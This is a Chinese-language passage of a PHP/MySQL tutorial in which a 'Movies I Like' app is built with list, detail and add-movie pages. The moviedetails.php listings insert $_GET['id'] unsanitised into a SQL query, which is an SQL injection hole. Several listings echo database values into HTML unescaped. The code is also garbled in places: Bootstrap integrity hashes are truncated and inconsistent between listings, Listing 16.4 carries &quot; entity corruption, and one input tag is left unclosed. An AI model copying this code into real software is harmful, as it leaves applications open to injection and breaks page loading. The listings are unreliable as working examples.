以 root 身份登录 MySQL CLI 工具，执行以下命令：

```
CREATE USER 'movieguru'@'localhost' IDENTIFIED BY 'ilikemovies';
GRANT ALL PRIVILEGES ON Movie.* TO 'movieguru'@'localhost';
FLUSH PRIVILEGES;
```

在 MySQL CLI 工具中运行此命令以创建用户并授予电影数据库的所有权限，我们可以看到图 15.1。

> 我们在授予其权限之前不需要创建数据库。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_155_0.png)

## 15. 显示项目详情列表

### 创建我们的电影数据库

使用浏览器，让我们以 movieguru 身份登录 Adminer 并创建数据库和表，如图 15.2 所示。

单击 Create database（图 15.3）。

输入 Movie 作为要创建的数据库名称并选择 Save，如图 15.4 所示

您应该会看到图 15.5 中的页面，其中显示 Adminer 和已创建的 Movie 数据库。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_156_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_156_1.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_156_2.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_156_3.png)

现在我们想要创建表。选择 **Create table**，如图 15.6 所示。

输入 `movieListing` 作为 *表名*：

对于 `id` 字段：

- 1. 在 **列名** 下输入 `id`
- 2. 将 *类型* 保持为 `int`
- 3. 选择 `AI` 单选按钮进行自动递增

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_157_0.png)

> > 通过将字段命名为 `id` 并使其自动递增，Adminer 将设置此字段为该表的主键。

对于 `title` 字段：

- 1. 在 `id` 下方的 **列名** 中输入 `title`
- 2. 将 *类型* 选择为 **varchar**
- 3. 输入 **50** 作为长度

对于 `rating` 字段：

- 1. 在 **列名** 下 `title` 下方，输入 `rating`
- 2. 将 *类型* 选择为 **varchar**
- 3. 输入 **10** 作为长度

对于 `director` 字段：

- 1. 在 **列名** 下 `rating` 下方，输入 `director`
- 2. 将 *类型* 选择为 **varchar**
- 3. 输入 **25** 作为长度

对于 `running_time_in_minutes` 字段：

- 1. 在 **列名** 下 `director` 下方，输入 `running_time_in_minutes`
- 2. 将 *类型* 选择为 **int**

对于 `genre` 字段：

- 在 **列名** 下 `running_time_in_minutes` 下方，输入 `genre`
- 将 *类型* 选择为 **varchar**
- 输入 **50** 作为长度

## 15. 显示项目详情列表

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_158_0.png)

然后选择 **Save**。图 15.7 是保存表之前“Create Table”表单应有的样子。

一旦您选择 **Save**，表描述应如下图 15.8 所示。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_158_1.png)

### 添加电影数据

我们也可以使用 Adminer 向我们的表添加一些数据。例如，让我们为三部电影添加一些数据。IMDB[^1] 始终是查找电影信息的绝佳场所。

选择 **movieListing** 返回 Adminer 中的 `movieListing` 表。

要添加新的电影列表，请选择 New item，见图 15.9。

为以下标题添加以下电影列表数据（或您选择的任何标题）：

- Sleepless in Seattle
- Star Wars: The Force Awakens
- Deadpool

为 *Sleepless in Seattle* 添加以下列表数据（图 15.10）：

- *title*: Sleepless in Seattle
- *rating*: PG
- *director*: Nora Ephron
- *running_time_in_minutes*: 105
- *genre*: Comedy, Drama, Romance

为 *Star Wars: The Force Awakens* 添加以下列表数据：

- *title*: Star Wars: The Force Awakens
- *rating*: PG-13
- *director*: J.J. Abrams
- *running_time_in_minutes*: 135
- *genre*: Action, Adventure, Science Fiction, Fantasy

[1] IMDB: https://www.imdb.com

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_159_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_159_1.png)



## 15. 显示项目详情列表

添加以下列表数据用于 *Deadpool*：

- *标题*: Deadpool
- *评级*: R
- *导演*: Tim Miller
- *运行时间（分钟）*: 108
- *类型*: Action, Adventure, Comedy

选择 **保存并插入下一个** 用于前两个电影列表。这样会保存数据并刷新数据录入表单。对于最后一个，按 **保存**（图 15.11）。

选择 *保存* 后，*选择：movieListing* 页面显示（图 15.12），显示您输入的所有电影列表。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_160_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_160_1.png)

### 创建主电影列表页面

我们首先创建一个 `index.php` 页面，列出 `Movie` 数据库中 `movieListing` 表中的所有电影标题。

### 布局主页面

为了让页面看起来整洁，我使用 Bootstrap[^2] CSS 框架并使用条纹表格。图 15.13 显示了我们希望主电影列表的外观。

> 熟悉 Bootstrap CSS 框架
> 
> 要了解更多关于 Bootstrap CSS 框架的信息并更熟练地使用它，请访问 https://getbootstrap.com 并点击 **开始使用** 按钮。在本书的这一版中，我将使用版本 4.2。

首先，让我们创建主电影列表脚本并将其命名为 `index.php`。我们从一个简单的样板开始，其中包含必要的 Bootstrap 框架组件，并将页面标题设为：“Movies I Like”。参见清单 15.1。

### 清单 15.1.

```
```html
<html>
<head>
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css"
integrity="sha384-GJzZQFQw1QTTNgwy59FfI1BuCjPlSa9DkKMP0Dg1M4i4Yj7g0ZJKYbI706tWS"
crossorigin="anonymous">
<title>Movies I Like</title>
</head>
<body>
<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
integrity="sha384-q8i/X+965DzO0rT7abK0W1sTQI..."
crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"
integrity="sha384-wHAiFfRl..."
crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"
integrity="sha384-B0Ugly..."
crossorigin="anonymous"></script>
</body>
</html>
```
```

[2] Bootstrap: https://getbootstrap.com

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_161_0.png)

## 15. 显示项目详情列表

### 存储数据库连接定义

接下来，让我们创建一个名为 dbconnection.php 的单独文件（清单 15.2）来存放我们的数据库凭据，我们将为其创建常量。由于我们在多个脚本中需要这些值，我们将它们存储在一个文件中，可以在整个应用程序中 require 或 include。

### 清单 15.2.

```
```php
1. <?php
2.   /* dbconnection.php */
3.
4.   // Database connection constants
5.   define('DB_HOST', 'localhost');
6.   define('DB_USER', 'movieguru');
7.   define('DB_PASSWORD', 'ilikemovies');
8.   define('DB_NAME', 'Movie');
```
```

> 通常，您会使用环境变量来保存敏感信息，但对于这些示例来说，这已经足够了。

### 显示电影列表表

现在让我们创建主电影列表脚本并将其命名为 index.php。在打开的 <body> 标签之后立即显示标题“Movies I Like”。接下来，让我们回到 index.php 页面，并在打开的 <body> 标签下方添加几个嵌套的 <div> 标签，以在 Bootstrap 所谓的“card”中显示我们的电影，如清单 15.3 所示。

### 清单 15.3.

```
```html
1. <body>
2.   <div class="card">
3.     <div class="card-body">
4.     </div>
5.   </div>
6.   <script ...
7.   ...
8. </body>
9. </html>
```
```

在最内层的 <div> 标签内，添加一个 <h1> 标题，名为“Movies I Like”：

```
```html
<body>
  <div class="card">
    <div class="card-body">
      <h1>Movies I Like</h1>
```
```

### 创建主电影列表页面

接下来（在 <h1> 标签之后），我们将添加一些 PHP 代码来包含我们的数据库连接常量并连接到数据库（清单 15.4）。我们使用 require_once() 使 dbconnection.php 值对脚本可用，并确保在脚本运行时该文件只加载一次。

### 清单 15.4.

```
```php
1. <h1>Movies I Like</h1>
2.
3. <?php
4. require_once('dbconnection.php');
5.
6. $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
7.     or trigger_error('Error connecting to MySQL server for DB_NAME.', E_USER_ERROR);
```
```

然后，我们将创建一个查询字符串，用于从 movielisting 表中获取所有电影的 id、title 字段并查询数据库：

```
$query = "SELECT id, title FROM movielisting ORDER BY title";

$result = mysqli_query($dbc, $query)
    or trigger_error('Error querying database movielisting', E_USER_ERROR);
```

请注意，当我们导航到“Movie Details”页面时，我们需要每个电影列表的 id，以便查询并检索所选电影的详细信息。

此时，我们只想在数据库中有电影时显示电影表：

```
if (mysqli_num_rows($result) > 0):
?>
    <table class="table table-striped">
        <thead>
            <tr>
                <th scope="col">Movie Title</th>
            </tr>
        </thead>
```

假设我们有电影可显示，此 while 循环会迭代并输出电影标题，如清单 15.5 所示。

## 15. 显示项目详情列表

### 清单 15.5.

```
<tbody>
<?php
    while($row = mysqli_fetch_assoc($result)):
?>
        <tr>
            <td><?= $row['title'] ?></td>
        </tr>
<?php
endwhile;
?>
```

然后我们关闭 <table>：

```
    </tbody>
    </table>
```

如果没有电影可列出，请添加 else: 条件，指示没有电影，然后关闭条件。这样的消息可以防止用户怀疑应用程序没有数据库或遇到错误或 bug。

```
<?php
    else:
?>
    <h3>No Movies Found :-(</h3>
<?php
    endif;
?>
```

清单 15.6 是迄今为止 index.php 脚本中 <body>（和 <div>）标签内的代码应有的样子。

### 清单 15.6.

```
<body>
    // ...
    <h1>Movies I Like</h1>

<?php
    require_once('dbconnection.php');

    $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
        or trigger_error('Error connecting to MySQL server for ' . DB_NAME, E_USER_ERROR);

    $query = "SELECT id, title FROM movieListing ORDER BY title";
```

```
```php
$result = mysqli_query($dbc, $query)
    or trigger_error('Error querying database movielisting', E_USER_ERROR);

if (mysqli_num_rows($result) > 0):
?>
    <table class="table table-striped">
    <thead>
        <tr>
            <th scope="col">Movie Title</th>
        </tr>
    </thead>
    <tbody>
<?php
    while($row = mysqli_fetch_assoc($result)):
?>
        <tr>
            <td><?= $row['title'] ?></td>
        </tr>
<?php
    endwhile;
?>
    </tbody>
    </table>
<?php
else:
?>
    <h3>No Movies Found :-(</h3>
<?php
endif;
// ...
</body>
```
```

### 将列表链接到详情页面

现在我们有了电影标题列表，我们希望为每部电影创建链接，将我们带到 moviedetails.php 页面。我们希望向 moviedetails.php 页面发送包含每部电影 id 字段的查询参数。查询参数通过 $_GET 超全局变量发送到 PHP 脚本。

### 使用 GET 与 POST

我们有两种选项可以在页面请求中发送数据。通常，这是为了发送要保存的表单数据或包含我们需要查找已保存数据的的信息。许多程序员可以互换使用 GET 和 POST，但它们对这些数据有不同的假设。

## 15. 显示项目详情列表

POST 的目的是更改服务器上的状态。因此，POST 通常用于表单和文件上传。

```
<form method="POST" action="doSomethingGood.php">
```

GET 也可以从表单发送（将 method 属性设置为 GET）。但它假设数据不会以任何方式保存或持久化。一个典型的用途是搜索表单，用于发送您想要查找的关键字。

```
<form method="GET" action="doSomethingGreat.php">
```

当 URL 包含查询参数时，这是一个 GET 请求。

```
<a href="moviedetails.php?id=1&title=Sleepless%20in%20Seattle">Sleepless in Seattle</a>
```

查询参数以键值对的形式发送在 URL 中。因此，在上面的 href 示例中，id 是键，1 是其值，title 是下一个键，Sleepless in Seattle 是其值。当发送多个查询参数时，用与号（&）分隔，如 1 之后和 title 之前所示。需要注意的另一点是，URL 中的空格使用百分号 (%20) 表示。URI 中具有特殊含义的几个其他符号也必须进行编码。PHP 的 http_build_query()[3] 简化了构建复杂的查询字符串。

从 mysqli_fetch_assoc() 返回的行数据为 PHP 中的链接构建查询参数可能如下所示：

```
while($row = mysqli_fetch_assoc($result))
{
    echo "<tr><td>" .
    "<a class='nav-link' href='moviedetails.php?id=' . $row['id'] .
    "&title=" . $row['title'] . "'>" . $row['title'] . "</a></td></tr>";
}
```

当发送源自数据库查询的查询参数时，更安全的做法是只发送主键字段，并在目标脚本中从数据库查询所需的其他字段。

[3] http_build_query(): https://php.net/http_build_query




## 创建主电影列表页面

因此，上述代码更好的查询方式如下：

```
while($row = mysqli_fetch_assoc($result))
{
	echo "<tr><td>" .
		"<a class='nav-link' href='moviedetails.php?id=" . $row['id'] . "'>" . $row['title'] . "</a></td></tr>";
}
```

当用户点击某个特定电影标题的链接时，我们希望将 `movieListing` 表中该行的主键作为查询参数发送到 `moviedetails.php` 页面。因此，我们希望将 `$row['id']` 作为查询参数发送。

在 `index.php` 中，将清单 15.7 中的代码：

```
<?php
while($row = mysqli_fetch_assoc($result)):
?>
<tr>
<td><?=$row['title']?></td>
</tr>
<?php
endwhile;
?>
```

替换为：

```
<?php
while($row = mysqli_fetch_assoc($result))
{
	echo "<tr><td>" .
		"<a class='nav-link' href='moviedetails.php?id=" . $row['id'] . "'>" . $row['title'] . "</a></td></tr>";
}
```

清单 15.8 展示了现在 `index.php` 文件的 `<body>` 标签内代码应有的样子。

```
<?php
while($row = mysqli_fetch_assoc($result))
{
	echo "<tr><td>" .
		"<a class='nav-link' href='moviedetails.php?id=" . $row['id'] . "'>" . $row['title'] . "</a></td></tr>";
}
```

## 15. 显示项目详细信息列表

清单 15.8。

```
1. <body>
2.   //...
3.   <h1>Movies I Like</h1>
4. 
5.   <?php
6.     require_once('dbconnection.php');
7. 
8.     $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
9.       or trigger_error(
10.      'Error connecting to MySQL server for ' . DB_NAME, E_USER_ERROR
11.      );
12. 
13.     $query = "SELECT id, title FROM movielisting ORDER BY title";
14. 
15.     $result = mysqli_query($dbc, $query)
16.       or trigger_error('Error querying database movielisting', E_USER_ERROR);
17. 
18.     if (mysqli_num_rows($result) > 0):
19. ?>
20.     <table class="table table-striped">
21.       <thead>
22.         <tr>
23.           <th scope="col">Movie Title</th>
24.         </tr>
25.       </thead>
26.       <tbody>
27. <?php
28.     while($row = mysqli_fetch_assoc($result))
29.     {
30.       echo "<tr><td>" .
31.         "<a class='nav-link' href='moviedetails.php?id=" . $row['id'] . "'>" . $row['title'] . "</a></td></tr>";
32.     }
33. ?>
34.       </tbody>
35.     </table>
36. <?php
37.     else:
38. ?>
39. <h3>No Movies Found :-(</h3>
40. <?php
41.     endif;
42. ?>
43.   // ...
44. </body>
```

图 15.14 展示了现在主电影列表页面的样子。

## 创建电影详情页面

现在，我们创建一个 `moviedetails.php` 页面，用于显示从电影列表页面中选定电影的详细信息。

## 布局详情页面

使用 Bootstrap CSS 框架和条纹表格，图 15.15 展示了我们希望电影详情页面呈现的样子。

## 编写详情页面脚本

创建另一个 PHP 脚本，并将其命名为 `moviedetails.php`。同样，我们将从一个简单的样板代码开始，其中包含必要的 Bootstrap 框架组件，并将页面标题设置为“电影详情”。我们还会在开始的 `<body>` 标签正下方添加几个嵌套的 `<div>` 标签，以便以 Bootstrap 所称的“卡片”形式显示电影（清单 15.9）。

清单 15.9。

```
<html>
<head>
  <link rel="stylesheet"
        href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css"
        integrity="sha384-GJzZqFGwb1QTTN6wy59ff1BuGJPjLSa9dKkMpo8giM4m1Yj7gZgWKYBI7O6tWS"
        crossorigin="anonymous">
  <title>Movie Details</title>
</head>
<body>
<div class="card">
  <div class="card-body">
  </div>
</div>
<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
        integrity="sha384-q8i/X+965DzO0rT7abK+1JSTQIAgVvRZvpzbo5smXKp4YfRVH+8abtTE1Pj6jizo"
        crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"
        integrity="sha384-wHafrFfR..."
        crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"
        integrity="sha384-B0UglyR+jN..."
        crossorigin="anonymous"></script>
</body>
</html>
```

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_169_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_169_1.png)

## 15. 显示项目详细信息列表

现在，在最内层的 `<div>` 标签中，添加一个导航链接，返回主电影列表页面“我喜欢的电影”，如清单 15.10 所示。

### 清单 15.10。

```
```html
1. <body>
2.   <div class="card">
3.     <div class="card-body">
4.       <nav class="nav">
5.         <a class="nav-link" href="index.php">Movies I Like</a>
6.       </nav>
7.     </div>
8. </div>
```
```

我们只希望在用户从某个电影标题链接进入页面时显示所选电影的详细信息，而不是在用户直接将 `moviedetails.php` 输入 URL 地址栏时显示（图 15.16）。

图 15.17 展示了从电影列表页面到电影详情页面的不正确导航方式。

如果用户通过在 URL 地址栏中输入 `moviedetails.php` 的方式错误地访问页面，我们希望显示图 15.18。

因此，我们需要添加一个 `if` 条件，用于检查是否接收到了查询参数并为其设置了值。

在此之前，我们需要了解 `$_GET[]` 超级全局变量。

## 超级全局变量 `$_GET`

与 `$_POST[]` 类似，`$_GET[]` 是一个超全局数组变量。当表单发送数据时，它可以保存表单数据；它也可以保存嵌入 URL 中、作为数据传递的查询参数。

从表单发送 GET 请求时，数据会自动发送，并使用 `name` 属性作为数组中的索引键进行访问。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_170_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_170_1.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_170_2.png)

## 创建电影详情页面

当数据作为查询参数嵌入 URL 时，会以键值对的形式构成 URL 的一部分。数组中的每个值都使用前面提到的键作为索引。请参见图 15.19。

将清单 15.11 中的 PHP 条件代码块添加到我们刚刚添加的导航链接下方。

### 清单 15.11。

```
```php
1. <nav class="nav">
2. <a class="nav-link" href="index.php">Movies I Like</a>
3. </nav>
4. <?php
5.     if (isset($_GET['id'])):
6. 
7.     else:
8. ?>
9. <h3>No Movie Details :-</h3>
10. <?php
11. endif;
12. ?>
```
```

我们只希望在用户因为从主页选择了某个电影列表链接而导航到此页面时，显示电影列表的详细信息。因此，我们会将获取并显示电影列表详细信息的代码放在 `if` 和 `else` 语句之间。

在 `if` 和 `else` 子句之间，添加代码，从 `movielisting` 表中获取所有字段，其中 `id` 字段等于 `$_GET['id']` 指定的值。我们需要使用通常的样板代码来连接数据库并执行查询，如清单 15.12 所示。

### 清单 15.12。

```
```php
1. <?php
2. if (isset($_GET['id'])):
3. 
4.     require_once('dbconnection.php');
5. 
6.     $id = $_GET['id'];
7. 
8.     $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
9.         or trigger_error('Error connecting to MySQL server for ' . DB_NAME, E_USER_ERROR);
10. 
11.     $query = "SELECT * FROM movielisting WHERE id = $id";
12. 
13.     $result = mysqli_query($dbc, $query)
14.         or trigger_error('Error querying database movielisting', E_USER_ERROR);
15. else:
16. ?>
```
```

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_171_0.png)

## 15. 显示项目详细信息列表

此查询应当只返回一行，我们应该确保它始终如此；如果没有返回一行，则显示没有电影详情。对查询结果调用 `mysqli_num_rows()` 函数，可以获得查询返回的行数。

在 `mysqli_query()` 函数下方添加以下 `if` 和 `else` 条件子句（清单 15.13），并在内部 `else` 子句之后、`endif` 之前的 `<h3>` 标签中再次输出没有电影详情的提示：

### 清单 15.13。

```
$result = mysqli_query($dbc, $query)
    or trigger_error('Error querying database movieListing', E_USER_ERROR);

    if (mysqli_num_rows($result) == 1):
    else:
    ?>
<h3>No Movie Details :-</h3>
<?php
    endif;
    else:
?>
<h3>No Movie Details :-</h3>
<?php
    endif;
?>
```

如果查询确实返回一行，我们就可以显示一个包含电影列表详细信息的表格。在以下语句的下方添加清单 15.14 中的代码：
`if (mysqli_num_rows($result) == 1):`

### 清单 15.14。

```
<?php
...
    if (mysqli_num_rows($result) == 1):

        $row = mysqli_fetch_assoc($result)
?>
<h1><?= $row['title'] ?></h1>
<table class="table table-striped">
    <tbody>
        <tr>
            <th scope="row">Rating</th>
            <td><?= $row['rating'] ?></td>
        </tr>
        <tr>
```




```
15.     <th scope="row">Director</th>
16.     <td><?= $row['director'] ?></td>
17. </tr>
18. <tr>
19.     <th scope="row">Running Time (minutes)</th>
20.     <td><?= $row['running_time_in_minutes'] ?></td>
21. </tr>
22. <tr>
23.     <th scope="row">Genre</th>
24.     <td><?= $row['genre'] ?></td>
25. </tr>
26. </tbody>
27. </table>
28. <?php
29. else:
30. ?>
31. <h3>No Movie Details :-(</h3>
32. <?php
33. endif;
34. else:
35. ?>
36. <h3>No Movie Details :-(</h3>
37. <?php
38. endif;
39. ?>
```

Listing 15.15 显示了完成时 moviedetails.php 脚本 <body> 标签内的代码应是什么样子的。

### Listing 15.15.

```
1. <body>
2.   //...
3.   <nav class="nav">
4.   <a class="nav-link" href="index.php">Movies I Like</a>
5.   </nav>
6.   <?php
7.   if (isset($_GET['id'])):
8. 
9.     require_once('dbconnection.php');
10. 
11.     $id = $_GET['id'];
12. 
13.     $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
14.       or trigger_error('Error connecting to MySQL server for ' . DB_NAME, E_USER_ERROR);
15. 
16.     $query = "SELECT * FROM movieListing WHERE id = $id";
17.
18. $result = mysqli_query($dbc, $query)
19.     or trigger_error('Error querying database movieListing', E_USER_ERROR);
20.
21.     if (mysqli_num_rows($result) == 1):
22.
23.         $row = mysqli_fetch_assoc($result)
24.     ?>
25. <h1><?= $row['title'] ?></h1>
26. <table class="table table-striped">
27.     <tbody>
28.         <tr>
29.             <th scope="row">Rating</th>
30.             <td><?= $row['rating'] ?></td>
31.         </tr>
32.         <tr>
33.             <th scope="row">Director</th>
34.             <td><?= $row['director'] ?></td>
35.         </tr>
36.         <tr>
37.             <th scope="row">Running Time (minutes)</th>
38.             <td><?= $row['running_time_in_minutes'] ?></td>
39.         </tr>
40.         <tr>
41.             <th scope="row">Genre</th>
42.             <td><?= $row['genre'] ?></td>
43.         </tr>
44.     </tbody>
45. </table>
46.     <?php
47.     else:
48.     ?>
49. <h3>No Movie Details :- (</h3>
50. <?php
51. endif;
52.     else:
53.     ?>
54. <h3>No Movie Details :- (</h3>
55. <?php
56. endif;
57. ?>
58. // ...
59. </body>
```

## 15. 显示项目列表详情

图 15.20 显示了我们当前电影详情页面的样子。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_174_0.png)

## 练习

- 1. 创建电影列表数据库并通过 Adminer 或 mysql 控制台添加数据。
- 2. 创建索引页面以显示所有电影。
- 3. 创建电影详情页面以显示单个电影的信息。将索引页面上的标题链接到正确的详情页面。

## Chapter 16

## 使用 Web 应用程序添加数据

> “在我自以为是的观点里，大多数人的 C 程序应该向下缩进六英尺并被泥土覆盖。”
> 
> - Blair P. Houghton

## 16. 使用 Web 应用程序添加数据

本章为我们在上一章创建的 *电影列表* 应用程序添加了添加电影列表数据的功能。

在创建列出各种类型数据的应用程序时，提供使用 Web 界面添加数据的能力也是合理的期望。例如，让我们创建一个脚本，允许用户添加新的电影列表数据。

> *请注意，通常你希望限制谁可以向数据库添加项目。在后续的安全章节中，我将向你展示如何通过用户登录正确限制 Web 应用程序添加数据的访问权限。*

### 创建添加电影的页面

我们首先创建 `addmovie.php` 页面，向用户显示用于输入所有电影列表数据的表单。当用户提交表单时，数据将被验证并插入到 `Movie` 数据库的 `MovieListing` 表中。

### 创建“添加电影”表单

图 16.1 显示了我们首次导航到它时“添加电影”页面应有的样子。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_178_0.png)

### 初始页面布局

创建另一个 PHP 脚本并将其命名为 addmovie.php。再次，我们将从一个简单的样板开始，其中包含必要的 Bootstrap 框架组件，并将页面标题命名为：“Add a Movie”。我们还将在开始的 <body> 标签下方添加几个嵌套的 <div> 标签，以在 Bootstrap 卡片中显示我们的电影。参见列表 16.1

### Listing 16.1.

```
1. <html>
2.   <head>
3.     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css"
4.         integrity="sha384-GJzZqFGwb1QTTN6wy59FF1B9UjLpsa9dkK4p0DgiM4n4YmJ0gZKYbI706tWs"
5.         crossorigin="anonymous">
6.     <title>Add a Movie</title>
7.   </head>
8.   <body>
9.     <div class="card">
10.     <div class="card-body">
11. 
12.     </div>
13.   <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
14.         integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpboSrnXKp4YfRvH+8abtTE1P1gJizo"
15.         crossorigin="anonymous"></script>
16.   <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"
17.         integrity="sha384-wHAiFfRlUXYxN1YsNxM4hV8LlPp9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
18.         crossorigin="anonymous"></script>
19.   <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"
20.         integrity="sha384-B0UglyR+jN8VA0sKNWPaJzYfRvH+8abtTE1P1gJizo"
21.         crossorigin="anonymous"></script>
22. </body>
23. </html>
```

现在在最内层的 <div> 标签内，在 <h1> 标签中向我们的页面添加标题“Add a Movie”，随后是返回主电影列表页面“Movies I Like”的 <nav> 链接，然后是水平线，如列表 16.2 和图 16.2 所示。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_179_0.png)

### Listing 16.2.

```
<body>
  <div class="card">
    <div class="card-body">
      <h1>Add a Movie</h1>
      <nav class="nav">
        <a class="nav-link" href="index.php">Movies I Like</a>
      </nav>
      <hr/>
    </div>
  </div>
```

接下来，我们想要显示我们的表单。稍后，我们将添加条件代码以在首次导航到 addmovie.php 页面时或出现验证错误时显示我们的表单。

你会注意到我在表单中的文本输入元素中添加了占位符文本，如图 16.3 所示。此文本不应替代使用标签元素：

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_180_0.png)

```
<form ...>
  <div class="form-group row">
    <label for="movie_title" class="col-sm-3 col-form-label-lg">Title</label>
    <div class="col-sm-8">
      <input type="text" class="form-control" id="movie_title" name="movie_title" placeholder="Title" required>
    ...
```

> Bootstrap 使用许多 div 元素和 class 属性进行样式设置，尤其是在使用其基于 Flexbox[1] 的网格布局系统时。有关如何使用 Bootstrap 的网格布局[2] 系统（版本 4.3）的更多信息，请参阅在线文档。

[1] 弹性盒子: https://css-tricks.com/snippets/css/a-guide-to-flexbox/
[2] 网格布局: https://getbootstrap.com/docs/4.3/layout/grid/

### 使用复选框创建类型数组

一部电影可以属于多个类型。由于我们想要为“Genre”包含各种选择，因此需要使用复选框（图 16.4）。如果我们创建一个包含我们类型的数组，也能减少 HTML 标记的重复。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_181_0.png)

列表 16.3 显示了“Genre”的 PHP 代码和 HTML 标记是什么样子的。

### Listing 16.3.

```
<?php
$genres = [
    'Action', 'Adventure', 'Comedy', 'Documentary', 'Drama',
    'Fantasy', 'Horror', 'Romance', 'Science Fiction'
];
?>
// ...
<?php
foreach ($genres as $genre)
{
?>
<div class="form-check form-check-inline col-sm-3">
    <input class="form-check-input" type="checkbox"
        id="movie_genre_checkbox_action"
        name="movie_genre_checkbox[]"
        value="<?= $genre ?>"
    <label class="form-check-label"
        for="movie_genre_checkbox_action"><?= $genre ?></label>
</div>
<?php
}
?>
```

前面的代码和标记为我们 genres 数组中的每个项目创建一个复选框输入。用户选择的每个类型都会被添加到 movie_genre_checkbox 数组中（请注意 name 属性中添加的 []）。请注意，如果用户未选择任何类型，movie_genre_checkbox name 属性将不存在于 $_POST[] 超全局数组中。




## 16. 使用 Web 应用程序添加数据

*表单的 PHP 代码和 HTML 标记*

Listing 16.4 是整个表单的 PHP 代码和 HTML 标记的样子。

### 列表 16.4.

```
<?php
$genres = [
    'Action', 'Adventure', 'Comedy', 'Documentary', 'Drama',
    'Fantasy', 'Horror', 'Romance', 'Science Fiction'
];
?>
...
<form class=&quot;needs-validation&quot; novalidate method=&quot;POST&quot;
    action=&quot;<?=$_SERVER['PHP_SELF']?>"
<div class=&quot;form-group row&quot;>
    <label for=&quot;movie_title&quot;
        class=&quot;col-sm-3 col-form-label-lg&quot;>Title</label>
<div class=&quot;col-sm-8&quot;>
    <input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;movie_title&quot;
        name=&quot;movie_title&quot; placeholder=&quot;Title&quot; required>
    <div class=&quot;invalid-feedback&quot;>
        Please provide a valid movie title.
    </div>
</div>
</div>
<div class=&quot;form-group row&quot;>
    <label for=&quot;movie_rating&quot;
        class=&quot;col-sm-3 col-form-label-lg&quot;>Rating</label>
<div class=&quot;col-sm-8&quot;>
    <select class=&quot;custom-select&quot; id=&quot;movie_rating&quot;
        name=&quot;movie_rating&quot; required>
        <option value=&quot;&quot; disabled selected>Rating...</option>
        <option value=&quot;G&quot;>G</option>
        <option value=&quot;PG&quot;>PG</option>
        <option value=&quot;PG-13&quot;>PG-13</option>
        <option value=&quot;R&quot;>R</option>
    </select>
    <div class=&quot;invalid-feedback&quot;>
        Please select a movie rating.
    </div>
</div>
</div>
<div class=&quot;form-group row&quot;>
    <label for=&quot;movie_director&quot;
        class=&quot;col-sm-3 col-form-label-lg&quot;>Director</label>
<div class=&quot;col-sm-8&quot;>
    <input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;movie_director&quot;
        name=&quot;movie_director&quot; placeholder=&quot;Director&quot; required>
```

### 创建添加电影的页面

```html
<div class="invalid-feedback">
    Please provide a valid movie director.
</div>
</div>
</div>
<div class="form-group row">
    <label for="movie_running_time_in_minutes" class="col-sm-3 col-form-label-lg">Running Time (min)</label>
    <div class="col-sm-8">
        <input type="number" class="form-control"
            id="movie_running_time_in_minutes"
            name="movie_running_time_in_minutes"
            placeholder="Running time (in minutes)" required>
        <div class="invalid-feedback">
            Please provide a valid running time in minutes.
        </div>
    </div>
</div>
<div class="form-group row">
    <label class="col-sm-3 col-form-label-lg">Genre</label>
    <div class="col-sm-8">
<?php
foreach ($genres as $genre)
{
?>
        <div class="form-check form-check-inline col-sm-3">
            <input class="form-check-input" type="checkbox"
                id="movie_genre_checkbox_action"
                name="movie_genre_checkbox[]"
                value="<?= $genre ?>">
            <label class="form-check-label"
